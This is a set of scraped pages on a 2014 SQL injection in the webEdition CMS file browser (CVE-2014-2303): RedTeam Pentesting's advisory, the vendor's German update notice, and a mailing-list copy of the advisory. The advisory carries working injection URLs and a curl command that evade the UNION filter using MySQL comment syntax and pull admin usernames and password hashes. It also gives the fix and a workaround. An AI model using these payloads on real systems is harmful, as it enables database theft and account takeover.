=== Content from www.redteam-pentesting.de_6198b5b4_20250126_094012.html ===
+49 241 510081-0kontakt@redteam-pentesting.de[DE](/de/advisories/rt-sa-2014-005/)[![RedTeam Pentesting Logo](/img/redteam-logo_hub5a66d245245ce30f53b50d2b4dfb31b_19123_120x0_resize_q100_h2_box_3.webp)](/)[DE](/de/advisories/rt-sa-2014-005/ "Deutsche Version")

* Company
  Company
  + [About us](/en/redteam/)
  + [History](/en/redteam/history/)
  + [Press](/en/press/)
  + [News Archive](/en/archive/)
* Pentest
  Pentest
  + [Definition](/en/pentest/)
  + [Types of Tests](/en/pentest/types/)
  + [Workflow](/en/pentest/workflow/)
  + [FAQ](/en/faq/)
* Publications
  Publications
  + [Overview](/en/publications/)
  + [Advisories](/en/advisories/)
  + [Talks](/en/talks/)
  + [Other Publications](/en/publications-other/)
* [Career](https://jobs.redteam-pentesting.de/)
* [Blog](https://blog.redteam-pentesting.de/)
* [Contact](#contactform)

Contact

Contact us

+49 241 510081-0kontakt@redteam-pentesting.de[Contact form](#contactform)JavaScript is not enabled in your browser. Please consider that some functions might not be available for you.![RedTeam Pentesting Header](/img/header/hl_header-1_hu0f2d230fb5185511a90e67c2e597c0b5_900546_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-2_hub774373357e916cb041b4943299d8717_1132770_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-3_hub8fc12cb70b2021e589c6810b4b53d04_895916_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-4_hu27d71f64bf1f030161a23c2dcd666f59_1015002_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-5_hud32f8d698ff23308f4d8b8566aae5928_933115_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-6_hu1bc03534cd122894ef676fff89833ac5_1144618_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-7_hu91e55bd77169043ae9e542f1b5f8f2f4_1354043_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-8_hu155130647c165410f2ffa35227549138_1321813_1000x0_resize_q100_h2_box.webp)[newer](https://www.redteam-pentesting.de/en/advisories/rt-sa-2014-006/)[back to overview](/en/advisories)[older](https://www.redteam-pentesting.de/en/advisories/rt-sa-2014-004/)

[Text Version](/en/advisories/rt-sa-2014-005.txt)

## SQL Injection in webEdition CMS File Browser

RedTeam Pentesting discovered an SQL injection vulnerability in the file
browser component of webEdition CMS during a penetration test.
Unauthenticated attackers can get read-only access on the SQL database
used by webEdition and read for example password hashes used by
administrative accounts.

### Details

* Product: webEdition CMS
* Affected Versions: webEdition 6.3.8.0 svn6985 down to 6.3.3.0,
* probably earlier versions, too
* Fixed Versions: 6.2.7-s1 - 6.3.8-s1
* Vulnerability Type: SQL Injection
* Security Risk: high
* Vendor URL: `http://www.webedition.org`
* Vendor Status: fixed version released
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2014-005`
* Advisory Status: published
* CVE: CVE-2014-2303
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2303`

### Introduction

“webEdition is a flexible CMS for companies of every size. It offers a
great amount of functionality and can be flexibly customized for
individual needs. It is ideally suited for users who want to operate
their web-site comfortably. Even the creation of custom web-applications
is easily possible with webEdition.”

(translated from webEdition homepage)

### More Details

The webEdition CMS contains a file browser component that allows
browsing parts of the website’s filesystem structure. It is usually
reachable under the following URL:

`http://www.example.com/webEdition/we_fs.php`

When browsing to individual directories, HTTP GET requests such as the
following are sent to the web server:

```
GET /webEdition/we_fs.php?what=4&table=tblFile&id=1&order=IsFolder%20
    DESC,%20Text&filter= HTTP/1.1
Host: www.example.com
[...]

```

The server responds with JavaScript code that updates the directory
listing:

```
<script>
top.clearEntries();
top.addEntry(13,"folder.gif","careers",1,"/en/careers");
top.addEntry(14,"folder.gif","company",1,"/en/company");
top.addEntry(15,"folder.gif","contact",1,"/en/contact");
top.addEntry(20,"we_dokument.gif","index.php",0,"/en/index.php");
top.writeBody(top.fsbody.document);
[...]
</script>

```

The requests which are sent to retrieve this information contain two
interesting parameters: “table” with a value of “tblFile” which appears
to name a database table, and the parameter “order” with a value of
“IsFolder DESC, Text”, which contains parts of an SQL ORDER BY clause.
In combination, these two parameters can be used to perform SQL
injection attacks. It appears that they are embedded into an SQL query
in a similar manner as follows:

```
SELECT ID,ParentID,Text,Path,IsFolder,Icon
       FROM tblFile
      WHERE [...]
   ORDER BY IsFolder DESC, Text

```

Using a `table` parameter value of `tblFile WHERE 1=1 /*` and an `order`
parameter value of `*/`, will result in a query similar to the
following:

```
SELECT ID,ParentID,Text,Path,IsFolder,Icon
       FROM tblFile WHERE 1=1 /*
      WHERE [...]
   ORDER BY */

```

The queries executed by the CMS retrieve six columns, which can be seen
in the application’s source code, or by injecting ORDER BY clauses with
numeric column indexes into the query. Knowing the number of columns in
a query, it is typically possible to use the UNION operator to obtain
additional information, for example from other tables. As a security
measure, webEdition implements filtering of the UNION keyword.

The web application checks whether the text “UNION” is part of
user-supplied information that is entered into database queries and then
blocks such queries. This behaviour is implemented in the file
`/webEdition/we/include/we_classes/database/we_database_base.class.php`
using the function
`preg_match('/[\s\(`"'\/)]union[\s(`\/]/i', $queryWithoutStrings)`.

The CMS first checks whether the text “UNION” appears in the query
string in any combination of upper- and lowercase characters. If that is
the case, a regular expression is used to determine whether the word
“UNION” appears in any context that is deemed dangerous by the
application developers. However, the underlying MySQL database system
supports embedding MySQL-specific query code within comments that
contain an exclamation mark ("!")
(see <https://dev.mysql.com/doc/refman/5.5/en/comments.html>).

For example, a query like

```
SELECT * FROM tblUsers WHERE 1=0 /*! OR 1=1 */

```

will yield no results on other database systems, but will return all
rows on MySQL. Likewise, the text `/*!UNION*/`, which is not caught by
the aforementioned regular expression, can be used instead of just
“UNION” on MySQL, thus enabling injections that use the UNION operator:

```
$ curl --silent 'http://www.example.com/webEdition/we_fs.php?what=4'\
'&table=tblFile+WHERE+1=0+/*!UNION*/+SELECT+1,2,3,4,5,6/*&order=*/'
<script>
top.clearEntries();
top.addEntry(1,"6","3",5,"4");
[...]

```
### Proof of Concept

The following URL lists the configured tables and their columns from the
webEdition database:

```
http://www.example.com/webEdition/we_fs.php?what=4&table=tblFile+WHERE+
    1=0+/*!UNION*/+SELECT+1,2,TABLE_NAME,4,COLUMN_NAME,TABLE_SCHEMA+
    FROM+INFORMATION_SCHEMA.COLUMNS/*&order=*/

```

The following URL retrieves configured users and hashed passwords from
the webEdition database:

```
http://www.example.com/webEdition/we_fs.php?what=4&table=tblFile+WHERE+
    1=0+/*!UNION*/+SELECT+1,2,passwd,4,5,username+FROM+tblUser/*&order=*/

```
### Workaround

Disable the file browser component of webEdition, for example by
deleting we\_fs.php.

### Fix

Update to a version with the suffix -s1. Those versions are available as
updates for releases between 6.2.7 and 6.3.8. The newest, updated
version would therefore be 6.3.8-s1.

Note that the version check of webEdition might tell you that there is
no update available and that you are running Version “6.3.8 (6.3.8.0
Release, SVN-Revision 6985). It will still tell you that the newest
available version is “6.3.8-s1 (6.3.8.0 Release, SVN-Revision 6985)”, so
you can use the “Update-Repetition” function to get the fix for this
vulnerability.

### Security Risk

Attackers can exploit this SQL injection vulnerability to read contents
of the webEdition database. This database contains, among published and
potentially unpublished content of the CMS, the credentials of the
administrative users of the CMS. If an attacker manages to find a
password for a password hash extracted using this SQL injection
vulnerability, the attacker could use these credentials to gain
administrative privileges in the CMS. This poses a high risk.

### Timeline

* 2014-02-20 Vulnerability identified
* 2014-03-04 Customer approved disclosure to vendor
* 2014-03-06 CVE number requested and assigned
* 2014-03-07 Vendor notified
* 2014-03-10 Vendor acknowledges vulnerability
* 2014-05-20 Vendor announces fixed versions
* 2014-05-28 Advisory released

### References

* [Wichtiges-Sicherheitsupdate-fuer-CMS-webEdition-veroeffentlicht (German)](https://www.webedition.org/de/aktuell/wichtiges-sicherheitsupdate-fuer-cms-webedition-veroeffentlicht)
* [Wichtige-Hinweise-zum-Sicherheitsupdate (German)](https://www.webedition.org/de/aktuell/wichtige-hinweise-zum-sicherheitsupdate)

### RedTeam Pentesting GmbH

RedTeam Pentesting offers individual penetration tests, short pentests,
performed by a team of specialised IT-security experts. Hereby, security
weaknesses in company networks or products are uncovered and can be
fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
<https://www.redteam-pentesting.de>.

# Contact us

We are happy to advise you and answer your questions.Contact dataPhone: +49 241 510081-0
Email: kontakt@redteam-pentesting.de
([GnuPG/PGP public key](/gpg/RedTeam-Pentesting-GPG-Kontakt-Key.asc))Visit and Postal AddressRedTeam Pentesting GmbH
Alter Posthof 1
52062 AachenEmployees of RedTeam Pentesting may be contacted directly at
firstname.lastname@redteam-pentesting.de:
([GnuPG/PGP public keys](/gpg/RedTeam-Pentesting-GPG-All-Keys.asc))Contact formâ![CAPTCHA]()
I agree to the transmission and processing of my data to RedTeam Pentesting according to RedTeam Pentesting’s [privacy policy](/en/imprint/privacy).
Company

* [About us](/en/redteam/)
* [History](/en/redteam/history/)
* [Press](/en/press/)
* [News Archive](/en/archive/)
Pentest

* [Definition](/en/pentest/)
* [Types of Tests](/en/pentest/types/)
* [Workflow](/en/pentest/workflow/)
* [FAQ](/en/faq/)
Publications

* [Overview](/en/publications/)
* [Advisories](/en/advisories/)
* [Talks](/en/talks/)
* [Other Publications](/en/publications-other/)
[Career](https://jobs.redteam-pentesting.de/)[Blog](https://blog.redteam-pentesting.de/)[Contact](#contactform)[Imprint](/en/imprint/) |
[Privacy Policy](/en/imprint/privacy/)

=== Content from www.webedition.org_f02ca120_20250125_145532.html ===

[![](//assets.webedition.org/images/webedition-cms-logo.svg?m=1538737574)](/ "Homepage webEdition CMS")
Menü

* [webEdition](https://www.webedition.org/de/webedition/)
  + [Lizenzvarianten](https://www.webedition.org/de/webedition/lizenzen/)
  + [Lizenzinformationen](https://www.webedition.org/de/webedition/lizenzen/lizenzierung.php)
  + [Download](https://www.webedition.org/de/webedition/)
  + [Anwender lieben webEdition](https://www.webedition.org/de/webedition/anwender.php)
  + [Entwickler lieben webEdition](https://www.webedition.org/de/webedition/entwickler.php)
  + [Mitglied im Verein werden](https://www.webedition.org/de/verein/mitglied-werden.php "Mitglied im Verein werden")
* [Funktionsübersicht](https://www.webedition.org/de/funktionen-module/)
  + **System und Wartung**
    - [Online-Installer](/de/funktionen-module/online-installer.php "Online-Installer")
    - [Updater](/de/funktionen-module/updater.php "Updater")
    - [Backups](/de/funktionen-module/backups.php "Backups")
    - [Sprachverwaltung](/de/funktionen-module/sprachverwaltung.php "Sprachverwaltung")
    - [Hooks](/de/funktionen-module/hooks.php "Hooks")
    - [we-Tags](//tags.webedition.org/)
  + **Produktivität**
    - [Workflow-Verwaltung](/de/funktionen-module/workflow.php "Workflow")
    - [Zeitplaner](/de/funktionen-module/zeitplaner.php "Scheduler/Zeitsteuerung")
    - [Versionierung](/de/funktionen-module/versionierung.php "Versionierung")
    - [Import/Export](/de/funktionen-module/import-export.php)
  + **Vollintegrierte Module**
    - [Navigation](/de/funktionen-module/navigation.php "Navigation")
    - [Datenbank/Objekt-Modul](/de/funktionen-module/datenbank-objekt-modul.php "Datenbank/Objekt-Modul")
    - [Kunden-/Userverwaltung](/de/funktionen-module/kundenverwaltung.php "Kundenverwaltung")
    - [Newsletter](/de/funktionen-module/newsletter.php "domeinguru.nl")
    - [Benutzerverwaltung](/de/funktionen-module/benutzerverwaltung.php "Benutzerverwaltung")
    - [Glossar](/de/funktionen-module/glossar.php "Glossar")
    - [Eigene we-Tags](/de/funktionen-module/eigene-we-tags.php "Eigene we-Tags")
    - [Medienverwaltung](/de/funktionen-module/medienverwaltung.php "Medienverwaltung")
    - [Multi-Domain](/de/funktionen-module/multidomain.php "Multidomain")
* [Doku & Community](/de/dokumentation-community/)
  + **Dokumentation**
    - [Systemvoraussetzungen](/de/dokumentation-community/systemvoraussetzungen.php)
    - [Tag-Referenz](/de/funktionen-module/tag-referenz.php)
    - [Bugs & Feature-Requests](/de/dokumentation-community/bugs-feature-requests.php)
    - [Versionshistorie](/de/dokumentation-community/versionshistorie/)
    - [Entwickler-Informationen](/de/dokumentation-community/versionshistorie/entwicklerinformationen.php "Entwickler-Informationen")
    - [Roadmap](/de/dokumentation-community/roadmap.php)
    - [Dokumentation - Wiki](https://documentation.webedition.org "Dokumentation - Wiki")
    - [Features/Bugfix - RSS](http://www.webedition.org/de/rss/qa-done-tickets.xml)
  + **we-Community**
    - [Forum](https://weforum.webedition.org "Forum")
    - [Konferenz](/de/dokumentation-community/konferenz/)
    - [Partner](/de/partner/)
  + **Wissenswertes**
    - [webEdition-TV](/de/dokumentation-community/webedition-tv.php "webEdition-TV")
    - [FAQ](/de/dokumentation-community/faq.php)
    - [Newsletter](/de/newsletter/ "Newsletter")
* [Partner](/de/partner/)
  + [Partner finden](/de/partner/ "Partner finden")
  + [Partnervorteile](/de/partner/vorteile.php "Partnervorteile")
  + [Partner werden](/de/partner/partner-werden.php)
  + [Login](/de/login/)
* [Referenzen](/de/referenzen/)
* [Verein](/de/verein/)
  + [Der Verein](/de/verein/)
  + [Vorstand](/de/verein/vorstand.php)
  + [Team](/de/verein/team.php)
  + [Mitglied werden](/de/verein/mitglied-werden.php)
  + [Vereinssatzung](/de/verein/satzung.php)
  + [Beitragsordnung](/de/verein/beitragsordnung.php)
  + [Fördersatzung](/de/verein/foerdersatzung.php)
  + [Nutzungsbedingungen](/de/verein/nutzungsbedingungen.php)
  + [Datenschutz](/de/verein/datenschutzbestimmungen.php)
* [Aktuell](/de/aktuell/)

# Wichtiges Sicherheitsupdate für CMS webEdition veröffentlicht

veröffentlicht: 20.05.2014

 Die Entwicklungen und der Ausbau des CMS schreiten weiter voran. Hierbei geht es nicht nur um neue Funktionen und optische Verbesserungen. Auch im Kern der Software stehen wichtige Erweiterungen an.

 Um Ihre Daten und Systeme zu schützen, setzen wir den Fokus verstärkt auf das Thema Sicherheit. Durch ein Sicherheitsaudit der RedTeam Pentesting GmbH wurden wir auf Lücken im System aufmerksam, die wir umgehend geschlossen haben. Zur Behebung der Sicherheitslücke haben wir Optimierungen an ca. 50 Programmteilen vorgenommen und stellen diese Änderungen in Form von speziellen Sicherheitspatches bereit.
## So schützen Sie Ihre webEdition-Installationen

Die Sicherheitspatches können Sie ab Version 6.2.7 als Updatewiederholung (Menü: Hilfe > Update > Nach neuer Version suchen) einspielen. Dadurch sind webEdition-Nutzer der Versionen 6.2.7 - 6.3.8 nicht gezwungen auf eine neue Version zu aktualisieren. Die eingespielten Sicherheitspatches erkennen Sie nach der Updatewiederholung am Zusatz -s1 in der Versionsnummer (z.B. 6.3.8-s1). Für die webEdition-Version 6.2.7 steht der Sicherheitspatch 6.2.7-s1.2 zur Verfügung. Ein Rebuild nach dem Update ist nicht notwendig.

 webEdition-Nutzer, die eine Version vor 6.2.7 einsetzen, sollten dringend ein Update auf 6.2.7 oder höher vornehmen. Wenn Sie Hilfe bei dem Update benötigen, können Sie sich gerne an einen Partnern unseres Parnternetzwerkes wenden.

 Grundsätzlich gilt: Im Internet sollte keine veraltete Software verwendet werden. Die vielen Datenskandale und Einbrüche zeigen, wie wichtig ein aktuelles System ist. Sind solche Lücken erst einmal bekannt, verbreiten sie sich schnell im Internet. Daher bitten wir Sie umgehend die Sicherheitspatches einzuspielen.

### Weitere News

* [webEdition 9.3.1 veröffentlicht](/de/aktuell/webedition-9.3.1-veroeffentlicht)
* [webEdition 9.3.0 veröffentlicht](/de/aktuell/webedition-9.3.0-veroeffentlicht)
* [webEdition 9.2.3 veröffentlicht](/de/aktuell/webedition-9.2.3-veroeffentlicht)
* [Gefälschte Emails im Umlauf](/de/aktuell/gefaelschte-emails-im-umlauf)
* [webEdition 9.2.2 veröffentlicht](/de/aktuell/webedition-9.2.2-veroeffentlicht)

[News-Übersicht](/de/aktuell/ "News-Übersicht")

Unterstütze uns!

![Paypal Pixel](//www.paypalobjects.com/de_DE/i/scr/pixel.gif)

* Partner
  + [Partner finden](/de/partner/)+ [Login](/de/login/)

* [Der Verein](/de/verein/ "Der Verein")
  + [Der Verein](/de/verein/)+ [Vorstand](/de/verein/vorstand.php)+ [Team](/de/verein/team.php "Vorstand")+ [Mitglied werden](/de/verein/mitglied-werden.php "Mitglied werden")+ [Vereinssatzung](/de/verein/satzung.php "Vereinssatzung")+ [Beitragsordnung](/de/verein/beitragsordnung.php "Beitragsordnung")+ [Fördersatzung](/de/verein/foerdersatzung.php "Fördersatzung")+ [Nutzungsbedingungen](/de/verein/nutzungsbedingungen.php "Nutzungsbedingungen")+ [Datenschutz](/de/verein/datenschutzbestimmungen.php "Datenschutz")

* Rechtliches
  + [Impressum](/impressum.php " http://qa.ebedition.org z")+ [Datenschutz](/datenschutz.php " http://qa.ebedition.org z")+ [Sitemap](/sitemap.php "Sitemap")

* Cookie Einstellungen anpassen

---

© 2025 webEdition e.V.

webEdition
Open Source Webapplication Framework

Unsere Website verwendet Cookies und ähnliche Technologien um Ihnen z.B. die Standorte unserer Partner\*innen zu zeigen und das Nutzer\*innen Verhalten zu analysieren. Sie können Cookies einzelner Anbieter de- bzw. aktivieren.

Die erteilte Einwilligung kann jederzeit unter "Cookie Einstellungen" wieder geändert werden.

Weitere Informationen finden Sie in unserer [Datenschutzerklärung](/datenschutz.php)
 und in unserem [Impressum](/impressum.php)

Alle Cookies zulassen
Cookie Einstellungen konfigurieren
Nur technisch notwendige Cookies zulassen

Einstellungen verwalten
Diese Website verwendet Cookies, um Ihren Besuch auf der Website so angenehm wie möglich zu gestalten.
Dieses Tool ermöglicht es Ihnen, verschiedene Cookies einzelner Anbieter zu de-/aktivieren.
Sie können diese Einstellungen jederzeit über den Link "Cookie Einstellungen" wieder ändern.

* technisch notwendige
* Google Analytics

  Ermöglicht uns die Analyse und statistische Erfassung des Nutzer\*innenverhaltens .
* Google Maps

  Wir nutzen Google Maps für die Darstellung der Partner-Standorte.

Auswahl speichern

[powered by webEdition CMS](https://www.webEdition.org "This page was created with webEdition CMS")

=== Content from seclists.org_3658d70c_20250125_145525.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](147)
[By Date](date.html#148)
[![Next](/images/right-icon-16x16.png)](149)

[![Previous](/images/left-icon-16x16.png)](147)
[By Thread](index.html#148)
[![Next](/images/right-icon-16x16.png)](157)

![](/shared/images/nst-icons.svg#search)

# [RT-SA-2014-005] SQL Injection in webEdition CMS File Browser Installer Script

---

*From*: RedTeam Pentesting GmbH <release () redteam-pentesting de>

*Date*: Wed, 28 May 2014 17:04:47 +0200

---

```
Advisory: SQL Injection in webEdition CMS File Browser

RedTeam Pentesting discovered an SQL injection vulnerability in the file
browser component of webEdition CMS during a penetration test.
Unauthenticated attackers can get read-only access on the SQL database
used by webEdition and read for example password hashes used by
administrative accounts.

Details
=======

Product: webEdition CMS
Affected Versions: webEdition 6.3.8.0 svn6985 down to 6.3.3.0,
                   probably earlier versions, too
Fixed Versions: 6.2.7-s1 - 6.3.8-s1
Vulnerability Type: SQL Injection
Security Risk: high
Vendor URL: <http://www.webedition.org>
Vendor Status: fixed version released
Advisory URL: <https://www.redteam-pentesting.de/advisories/rt-sa-2014-005>
Advisory Status: published
CVE: CVE-2014-2303
CVE URL: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2303>

Introduction
============

"webEdition is a flexible CMS for companies of every size. It offers a
great amount of functionality and can be flexibly customized for
individual needs. It is ideally suited for users who want to operate
their web-site comfortably. Even the creation of custom web-applications
is easily possible with webEdition."

(translated from webEdition homepage)

More Details
============

The webEdition CMS contains a file browser component that allows
browsing parts of the website's filesystem structure. It is usually
reachable under the following URL:

<http://www.example.com/webEdition/we_fs.php>

When browsing to individual directories, HTTP GET requests such as the
following are sent to the web server:

GET /webEdition/we_fs.php?what=4&table=tblFile&id=1&order=IsFolder%20
    DESC,%20Text&filter= HTTP/1.1
Host: www.example.com
[...]

The server responds with JavaScript code that updates the directory
listing:

<script>
top.clearEntries();
top.addEntry(13,"folder.gif","careers",1,"/en/careers");
top.addEntry(14,"folder.gif","company",1,"/en/company");
top.addEntry(15,"folder.gif","contact",1,"/en/contact");
top.addEntry(20,"we_dokument.gif","index.php",0,"/en/index.php");
top.writeBody(top.fsbody.document);
[...]
</script>

The requests which are sent to retrieve this information contain two
interesting parameters: "table" with a value of "tblFile" which appears
to name a database table, and the parameter "order" with a value of
"IsFolder DESC, Text", which contains parts of an SQL ORDER BY clause.
In combination, these two parameters can be used to perform SQL
injection attacks. It appears that they are embedded into an SQL query
in a similar manner as follows:

SELECT ID,ParentID,Text,Path,IsFolder,Icon
       FROM tblFile
      WHERE [...]
   ORDER BY IsFolder DESC, Text

Using a "table" parameter value of "tblFile WHERE 1=1 /*" and an "order"
parameter value of "*/", will result in a query similar to the
following:

SELECT ID,ParentID,Text,Path,IsFolder,Icon
       FROM tblFile WHERE 1=1 /*
      WHERE [...]
   ORDER BY */

The queries executed by the CMS retrieve six columns, which can be seen
in the application's source code, or by injecting ORDER BY clauses with
numeric column indexes into the query. Knowing the number of columns in
a query, it is typically possible to use the UNION operator to obtain
additional information, for example from other tables. As a security
measure, webEdition implements filtering of the UNION keyword.

The web application checks whether the text "UNION" is part of
user-supplied information that is entered into database queries and then
blocks such queries. This behaviour is implemented in the file

/webEdition/we/include/we_classes/database/we_database_base.class.php
using the function
preg_match('/[\s\(`"\'\\/)]union[\s\(`\/]/i', $queryWithoutStrings)

The CMS first checks whether the text "UNION" appears in the query
string in any combination of upper- and lowercase characters. If that is
the case, a regular expression is used to determine whether the word
"UNION" appears in any context that is deemed dangerous by the
application developers. However, the underlying MySQL database system
supports embedding MySQL-specific query code within comments that
contain an exclamation mark ("!")
(see <https://dev.mysql.com/doc/refman/5.5/en/comments.html>).

For example, a query like

SELECT * FROM tblUsers WHERE 1=0 /*! OR 1=1 */

will yield no results on other database systems, but will return all
rows on MySQL. Likewise, the text "/*!UNION*/", which is not caught by
the aforementioned regular expression, can be used instead of just
"UNION" on MySQL, thus enabling injections that use the UNION operator:

$ curl --silent '<http://www.example.com/webEdition/we_fs.php?what=4'\>
'&table=tblFile+WHERE+1=0+/*!UNION*/+SELECT+1,2,3,4,5,6/*&order=*/'
<script>
top.clearEntries();
top.addEntry(1,"6","3",5,"4");
[...]

Proof of Concept
================

The following URL lists the configured tables and their columns from the
webEdition database:

<http://www.example.com/webEdition/we_fs.php?what=4&table=tblFile+WHERE+>
    1=0+/*!UNION*/+SELECT+1,2,TABLE_NAME,4,COLUMN_NAME,TABLE_SCHEMA+
    FROM+INFORMATION_SCHEMA.COLUMNS/*&order=*/

The following URL retrieves configured users and hashed passwords from
the webEdition database:

<http://www.example.com/webEdition/we_fs.php?what=4&table=tblFile+WHERE+>
    1=0+/*!UNION*/+SELECT+1,2,passwd,4,5,username+FROM+tblUser/*&order=*/

Workaround
==========

Disable the file browser component of webEdition, for example by
deleting we_fs.php.

Fix
===

Update to a version with the suffix -s1. Those versions are available as
updates for releases between 6.2.7 and 6.3.8. The newest, updated
version would therefore be 6.3.8-s1.

Note that the version check of webEdition might tell you that there is
no update available and that you are running Version "6.3.8 (6.3.8.0
Release, SVN-Revision 6985). It will still tell you that the newest
available version is "6.3.8-s1 (6.3.8.0 Release, SVN-Revision 6985)", so
you can use the "Update-Repetition" function to get the fix for this
vulnerability.

Security Risk
=============

Attackers can exploit this SQL injection vulnerability to read contents
of the webEdition database. This database contains, among published and
potentially unpublished content of the CMS, the credentials of the
administrative users of the CMS. If an attacker manages to find a
password for a password hash extracted using this SQL injection
vulnerability, the attacker could use these credentials to gain
administrative privileges in the CMS. This poses a high risk.

Timeline
========

2014-02-20 Vulnerability identified
2014-03-04 Customer approved disclosure to vendor
2014-03-06 CVE number requested and assigned
2014-03-07 Vendor notified
2014-03-10 Vendor acknowledges vulnerability
2014-05-20 Vendor announces fixed versions
2014-05-28 Advisory released

References
==========

<http://www.webedition.org/de/aktuelles/webedition-cms/>
    Wichtiges-Sicherheitsupdate-fuer-CMS-webEdition-veroeffentlicht
    (German)

RedTeam Pentesting GmbH
=======================

RedTeam Pentesting offers individual penetration tests, short pentests,
performed by a team of specialised IT-security experts. Hereby, security
weaknesses in company networks or products are uncovered and can be
fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
<https://www.redteam-pentesting.de>.

--
RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
Dennewartstr. 25-27                       Fax : +49 241 510081-99
52068 Aachen                    <https://www.redteam-pentesting.de>
Germany                         Registergericht: Aachen HRB 14004
Geschäftsführer:                       Patrick Hof, Jens Liebchen

```

**Attachment:
[signature.asc](att-148/signature_asc.bin)**

*Description:* Digital signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](147)
[By Date](date.html#148)
[![Next](/images/right-icon-16x16.png)](149)

[![Previous](/images/left-icon-16x16.png)](147)
[By Thread](index.html#148)
[![Next](/images/right-icon-16x16.png)](157)

### Current thread:

* **[RT-SA-2014-005] SQL Injection in webEdition CMS File Browser Installer Script** *RedTeam Pentesting GmbH (May 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.redteam-pentesting.de_84a6c797_20250125_145532.html ===
+49 241 510081-0kontakt@redteam-pentesting.de[DE](/de/advisories/rt-sa-2014-005/)[![RedTeam Pentesting Logo](/img/redteam-logo_hub5a66d245245ce30f53b50d2b4dfb31b_19123_120x0_resize_q100_h2_box_3.webp)](/)[DE](/de/advisories/rt-sa-2014-005/ "Deutsche Version")

* Company
  Company
  + [About us](/en/redteam/)
  + [History](/en/redteam/history/)
  + [Press](/en/press/)
  + [News Archive](/en/archive/)
* Pentest
  Pentest
  + [Definition](/en/pentest/)
  + [Types of Tests](/en/pentest/types/)
  + [Workflow](/en/pentest/workflow/)
  + [FAQ](/en/faq/)
* Publications
  Publications
  + [Overview](/en/publications/)
  + [Advisories](/en/advisories/)
  + [Talks](/en/talks/)
  + [Other Publications](/en/publications-other/)
* [Career](https://jobs.redteam-pentesting.de/)
* [Blog](https://blog.redteam-pentesting.de/)
* [Contact](#contactform)

Contact

Contact us

